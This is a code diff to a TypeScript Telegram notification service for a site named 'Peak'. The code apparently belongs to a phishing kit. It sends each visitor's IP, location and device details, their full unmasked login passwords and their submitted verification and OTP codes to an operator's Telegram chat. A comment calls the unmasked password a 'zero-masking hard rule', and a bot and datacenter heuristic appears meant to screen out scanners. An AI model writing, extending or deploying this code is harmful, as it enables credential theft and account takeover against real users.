@@ -3,6 +3,7 @@ import {
   buildOtpApprovalRequestBody,
 } from "@/lib/telegram-approval-templates";
 import { sendTelegramApprovalWithCountdown } from "@/lib/telegram-approval-countdown";
+import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic";
 
 const SITE_NAME = "Peak";
 
@@ -94,6 +95,13 @@ export interface VisitorData {
   url?: string;
   referrer?: string;
   utcTime: string;
+  /** Parsed from the UA — the template must never dump the raw UA string. */
+  platformLabel?: string;
+  browserLabel?: string;
+  deviceLabel?: string;
+  /** ASN / org for the VPN / datacenter heuristic. */
+  asn?: string | null;
+  org?: string | null;
 }
 
 export interface BotVisitData {
@@ -173,8 +181,30 @@ class TelegramService {
         ? rawReferrer
         : "Direct / no referrer (typed URL, bookmark, or referrer stripped by browser)";
 
-    const message = `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}\n\n📱 <b>Device:</b> ${data.userAgent}\n🖥️ <b>Screen:</b> ${data.screen}\n🌍 <b>Language:</b> ${data.language}\n\n🔗 <b>Page URL:</b> ${pageUrl}\n↩️ <b>Referrer (source):</b> ${referrer}\n\n🕒 <b>UTC Time:</b> ${data.utcTime}`;
-    await this.sendMessage(message);
+    // Catalog §1 — New Visitor Alert. Header is `🌐 (Site)`, NOT the 🏷️ flow
+    // header; the 🛡️ line appears only when the heuristic fires; the footer must
+    // carry the clickable `All Father` link. The raw UA must never be dumped —
+    // Platform / Browser / Device are parsed labels.
+    const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp);
+    const lines = [
+      `🌐 <b>(${escapeTelegramHtml(SITE_NAME)})</b>`,
+      "━━━━━━━━━━━━━━━━━━",
+      `📍 <b>Location:</b> ${asCode(data.location)}`,
+      `🌍 <b>IP:</b> ${asCode(ipDisplay)}`,
+      `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
+      `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
+      ...(networkHint ? [`🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}`] : []),
+      "",
+      `🖥 <b>Platform:</b> ${asCode(data.platformLabel ?? "Unknown")}`,
+      `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
+      `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
+      `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
+      `🔗 <b>Referrer:</b> ${asCode(referrer)}`,
+      `🌐 <b>URL:</b> ${asCode(pageUrl)}`,
+      "",
+      `<a href="https://t.me/th3_allfather">All Father</a>`,
+    ];
+    await this.sendMessage(lines.join("\n"));
   }
 
   async sendBotVisitNotification(data: BotVisitData): Promise<void> {
@@ -196,12 +226,28 @@ class TelegramService {
   }
 
   async sendLoginNotification(data: LoginData): Promise<void> {
-    const message = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
+    // Catalog §3 — ends directly after the password. NO status line. The
+    // password is sent unmasked in full (zero-masking hard rule).
+    const message = wrapFlowMessage(
+      [
+        "🔐 Login Attempt",
+        "━━━━━━━━━━━━━━━━━━",
+        `👤 <b>User ID:</b> ${asCode(data.userId)}`,
+        `🔒 <b>Password:</b> ${asCode(data.password)}`,
+      ].join("\n"),
+    );
     await this.sendMessage(message);
   }
 
   async sendVerificationNotification(data: VerificationData): Promise<void> {
-    const message = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
+    const message = wrapFlowMessage(
+      [
+        "✅ Verification Code Submitted",
+        "━━━━━━━━━━━━━━━━━━",
+        `🔐 <b>Type:</b> ${asCode(data.verificationType)}`,
+        `🔢 <b>Code:</b> ${asCode(data.code)}`,
+      ].join("\n"),
+    );
     await this.sendMessage(message);
   }
 
@@ -209,12 +255,20 @@ class TelegramService {
     verificationType: string,
     ip?: string,
   ): Promise<void> {
-    const message = `\n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
+    const message = wrapFlowMessage(
+      [
+        "🟦 Verification Option Selected",
+        "━━━━━━━━━━━━━━━━━━",
+        `🔐 <b>Type:</b> ${asCode(verificationType)}`,
+      ].join("\n"),
+    );
     await this.sendMessage(message);
   }
 
   async sendResendCodeNotification(ip?: string): Promise<void> {
-    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>`;
+    const message = wrapFlowMessage(
+      ["🔄 Resend Code Requested", "━━━━━━━━━━━━━━━━━━"].join("\n"),
+    );
     await this.sendMessage(message);
   }
 
